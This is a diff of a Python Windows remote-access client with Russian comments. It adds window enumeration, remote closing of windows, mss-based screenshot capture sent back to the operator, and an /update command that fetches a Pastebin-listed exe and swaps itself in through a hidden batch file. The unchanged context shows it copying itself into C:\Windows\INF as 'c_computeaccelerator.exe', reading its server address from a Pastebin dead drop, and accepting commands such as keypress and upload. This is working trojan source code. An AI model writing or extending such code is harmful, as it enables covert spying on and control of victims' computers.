@@ -4,6 +4,9 @@ import keyboard
 import os
 import sys
 import requests
+import win32gui
+import win32con
+import mss
 import ctypes
 import pyautogui
 import time
@@ -27,7 +30,6 @@ import struct
 # Настройка логирования
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s', handlers=[logging.StreamHandler()])
 logger = logging.getLogger(__name__)
-
 
 # ====== Автоопределение CLIENT_ID ======
 def get_hwid():
@@ -73,8 +75,8 @@ CLIENT_ID = f"{device_name}/{get_hwid()}"
 logger.info(f"CLIENT_ID: {CLIENT_ID}")
 
 # ====== Настройки подключения ======
-PASTEBIN_RAW_URL = "https://pastebin.com/raw/xxxyyy" # Поменять
-
+PASTEBIN_RAW_URL = "https://pastebin.com/raw/xxyyy" # Вставить
+#
 def get_server_config():
     
     """
@@ -121,7 +123,7 @@ SERVER_IP, SERVER_PORT = get_server_config()
 RECONNECT_DELAY = 5
 
 # ====== Глобальные переменные ======
-CURRENT_VERSION = 18
+CURRENT_VERSION = 20
 TARGET_DIR = r"C:\Windows\INF"
 new_name="c_computeaccelerator.exe"
 stop_event = threading.Event()
@@ -154,6 +156,34 @@ def initialize_mixer():
             logger.error(f"Failed to initialize pygame mixer: {e}")
             return False
     return True
+
+############################
+
+def is_good_window(hwnd):
+    if not win32gui.IsWindowVisible(hwnd):
+        return False
+
+    title = win32gui.GetWindowText(hwnd).strip()
+    if not title:
+        return False
+
+    # Системные окна, которые должны быть скрыты
+    blacklist = {
+        "Program Manager",
+        "Default IME",
+        "MSCTFIME UI"
+    }
+
+    if title in blacklist:
+        return False
+
+    return True
+
+
+def enum_windows_callback(hwnd, windows_list):
+    if is_good_window(hwnd):
+        title = win32gui.GetWindowText(hwnd)
+        windows_list.append((hwnd, title))
 
 ############################
 
@@ -282,9 +312,8 @@ def change_shell():
     finally:
         print("[END] Работа потока изменения shell завершена")
 
-############################
 
-def copy_to_target(new_name="c_computeaccelerator.exe"):
+def copy_to_target():
     try:
         if not os.path.exists(TARGET_DIR):
             os.makedirs(TARGET_DIR)
@@ -906,6 +935,61 @@ def cmd_keypress(args):
     except Exception as e:
         return f"Ошибка: {e}"
 
+def cmd_applist(args):
+    args = args.strip()
+
+    windows = []
+    win32gui.EnumWindows(enum_windows_callback, windows)
+
+    if not args:
+        if not windows:
+            return "❌ Нет открытых окон."
+
+        lines = ["📋 Открытые окна:"]
+        for i, (_, title) in enumerate(windows, start=1):
+            lines.append(f"{i}. {title}")
+
+        return "\n".join(lines)
+
+    # Если указан номер
+    if not args.isdigit():
+        return "❌ Укажите номер окна: /applist <номер>"
+
+    index = int(args)
+
+    if index < 1 or index > len(windows):
+        return f"❌ Неверный номер. Доступно: 1..{len(windows)}"
+
+    hwnd, title = windows[index - 1]
+
+    try:
+        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+        win32gui.SetForegroundWindow(hwnd)
+        return f"➡️ Окно «{title}» выведено на передний план."
+    except Exception as e:
+        return f"❌ Не удалось активировать окно: {e}"
+
+def cmd_applist_close(args):
+    args = args.strip()
+
+    if not args.isdigit():
+        return "❌ Формат: /applist_close <номер>"
+
+    index = int(args)
+
+    windows = []
+    win32gui.EnumWindows(enum_windows_callback, windows)
+
+    if index < 1 or index > len(windows):
+        return f"❌ Неверный номер. Доступно: 1..{len(windows)}"
+
+    hwnd, title = windows[index - 1]
+
+    try:
+        win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
+        return f"🛑 Окно «{title}» отправлено на закрытие."
+    except Exception as e:
+        return f"❌ Ошибка закрытия: {e}"
 
 def cmd_mousemove(args):
     if not args:
@@ -1371,29 +1455,47 @@ def send_response(conn, result, cmd_name="N/A", is_file=False, file_path=None):
 def cmd_screenshot(args, conn):
     logger.debug(f"Выполняется /screenshot с аргументами: {args}")
     temp_path = None
+    
+    # 1. Используем tempfile для безопасного создания временного файла
+    # Используем .png, так как cv2.imencode сжимает его в память,
+    # но для конечного файла лучше оставить .jpg, как у вас было.
+    temp_path = os.path.join(os.environ['TEMP'], f'{uuid.uuid4()}.jpg') 
+    # Используем уникальное имя, чтобы избежать конфликтов
+    
     try:
-        temp_path = os.path.join(os.environ['TEMP'], 'screenshot.jpg')
-        # ... (логика создания скриншота осталась прежней) ...
-        for attempt in range(3):
-            pyautogui.screenshot(temp_path)
-            if os.path.getsize(temp_path) > 1024:
-                img = cv2.imread(temp_path)
-                cv2.imwrite(temp_path, img, [int(cv2.IMWRITE_JPEG_QUALITY), 95])
-                break
-            time.sleep(0.5)
-        else:
-            if temp_path and os.path.exists(temp_path):
-                 os.remove(temp_path)
-            send_response(conn, "❌ Не удалось сделать скриншот")
-            return None
+        # --- БЛОК ЗАХВАТА ЭКРАНА С ПОМОЩЬЮ MSS ---
+        with mss.mss() as sct:
+            # 1. Захват основного монитора (индекс 1 соответствует первому монитору)
+            # Если нужно захватывать ВСЕ мониторы, нужно перебрать их
+            monitor = sct.monitors[1]
+            sct_img = sct.grab(monitor)
             
+            # 2. Преобразование захваченного изображения mss (BGRA) в массив OpenCV (BGR)
+            img_array = np.array(sct_img, dtype=np.uint8)
+            # mss возвращает 4 канала (BGRA), cv2.imwrite лучше работает с 3 каналами (BGR)
+            image = cv2.cvtColor(img_array, cv2.COLOR_BGRA2BGR)
+            
+        # --- ОПТИМИЗАЦИЯ И СОХРАНЕНИЕ ---
+        # Сразу сохраняем с нужным качеством JPEG (95)
+        # Убраны циклы попыток, так как mss очень надежен
+        success = cv2.imwrite(temp_path, image, [int(cv2.IMWRITE_JPEG_QUALITY), 95])
+
+        if not success or os.path.getsize(temp_path) < 1024:
+            # Проверка размера на случай, если скриншот вышел очень маленький
+            send_response(conn, "❌ Не удалось сделать или сохранить скриншот (файл мал).")
+            return
+
+        # --- ОТПРАВКА ---
         error = send_file(conn, temp_path)
         send_response(conn, error or "✅ Скриншот отправлен")
         return None
+        
     except Exception as e:
         send_response(conn, f"❌ Скриншот: {str(e)}")
         return None
+        
     finally:
+        # Очистка временного файла
         if temp_path and os.path.exists(temp_path):
             os.remove(temp_path)
 
@@ -1897,54 +1999,52 @@ def cmd_upload(payload, conn, initial_data=b''):
 
 def cmd_update(args, conn):
     """
-    Команда /update: Проверяет обновление через Pastebin raw URL.
-    Аргумент: raw URL Pastebin (например, https://pastebin.com/raw/XXXXXX)
-    Формат Pastebin: "Ver X - https://direct.link/to/new_client.exe"
-    Если версия выше текущей, скачивает и заменяет exe.
+    Формат:
+    /update https://pastebin.com/raw/XXXXXXX
     """
     if not args.strip():
         return "❌ Укажите raw URL Pastebin: /update https://pastebin.com/raw/XXXXXX"
-    
-    pastebin_url = "https://pastebin.com/raw/v25titFe"
-    
+
+    pastebin_url = args.strip()
+
     try:
         # 1. Скачиваем содержимое Pastebin
         response = requests.get(pastebin_url)
         response.raise_for_status()
         content = response.text.strip()
-        
-        # 2. Парсим: "Ver X - link"
+
+        # 2. Парсим: "Ver X - url"
         if not content.startswith("Ver "):
             return "❌ Некорректный формат Pastebin. Ожидается: 'Ver X - link'"
-        
+
         parts = content.split(" - ", 1)
         if len(parts) != 2:
             return "❌ Некорректный формат. Ожидается: 'Ver X - link'"
-        
-        ver_str = parts[0][4:].strip()  # Извлекаем X после "Ver "
+
+        ver_str = parts[0][4:].strip()
         download_link = parts[1].strip()
-        
+
         new_version = int(ver_str)
-        
+
         # 3. Проверяем версию
+        global CURRENT_VERSION
         if new_version <= CURRENT_VERSION:
             return f"ℹ️ Клиент уже на актуальной версии (текущая: {CURRENT_VERSION}, доступная: {new_version})."
-        
+
         # 4. Скачиваем новый exe
         send_response(conn, f"✅ Обнаружена новая версия {new_version}. Скачивание...")
-        
+
         new_exe_response = requests.get(download_link, stream=True)
         new_exe_response.raise_for_status()
-        
-        # Получаем путь к текущему exe (sys.executable для PyInstaller)
+
         current_exe = sys.executable
         temp_exe = os.path.join(os.path.dirname(current_exe), f"new_client_{new_version}.exe")
-        
+
         with open(temp_exe, 'wb') as f:
             for chunk in new_exe_response.iter_content(chunk_size=8192):
                 f.write(chunk)
-        
-        # 5. Создаем BAT для замены (Windows-only)
+
+        # 5. Создаём BAT для замены
         bat_path = os.path.join(os.path.dirname(current_exe), "update.bat")
         bat_content = f"""@echo off
 timeout /t 2 /nobreak >nul
@@ -1956,20 +2056,16 @@ del "%~f0"
 """
         with open(bat_path, 'w') as bat_file:
             bat_file.write(bat_content)
-        
-        # 6. Запускаем BAT и завершаем текущий процесс
+
+        # 6. Запуск BAT
         subprocess.Popen(bat_path, creationflags=subprocess.CREATE_NO_WINDOW)
         send_response(conn, "✅ Обновление скачано. Клиент перезапустится для применения.")
-        
-        # Завершаем текущий процесс (BAT подождет и заменит)
+
         os._exit(0)
-        
-    except requests.RequestException as e:
-        return f"❌ Ошибка скачивания: {e}"
-    except ValueError:
-        return "❌ Некорректная версия в Pastebin (должна быть числом)."
+
     except Exception as e:
-        return f"❌ Критическая ошибка обновления: {e}"
+        return f"❌ Ошибка обновления: {e}"
+
 
 
 
@@ -2079,6 +2175,8 @@ COMMANDS = {
     "/move": cmd_move,
     "/msg": cmd_msg,
     "/wallpaper": cmd_wallpaper,
+    "/applist": cmd_applist,
+    "/applist_close": cmd_applist_close,
     "/volumeplus": cmd_volumeplus,
     "/volumeminus": cmd_volumeminus,
     "/download_link": cmd_download_link,
